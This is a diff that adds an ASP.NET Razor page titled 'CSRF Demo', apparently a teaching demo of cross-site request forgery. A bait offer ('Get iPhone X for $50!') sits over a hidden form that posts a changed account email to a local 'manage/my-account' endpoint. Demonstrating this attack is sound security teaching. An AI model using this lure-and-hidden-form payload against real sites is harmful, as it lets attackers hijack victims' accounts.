@@ -1,0 +1,15 @@
+﻿@{
+    ViewData["Title"] = "CSRF Demo";
+}
+
+<div class="text-center">
+    <h1 class="display-4">Welcome to CSRF demo</h1>
+
+    <div>
+        <p>Get iPhone X for $50!</p>
+        <form method="post" action="https://localhost:44315/manage/my-account">
+            <input type="hidden" name="Email" value="hacked@microsoft.com" />
+            <input type="submit" value="Just one click for the best price!" />
+        </form>
+    </div>
+</div>
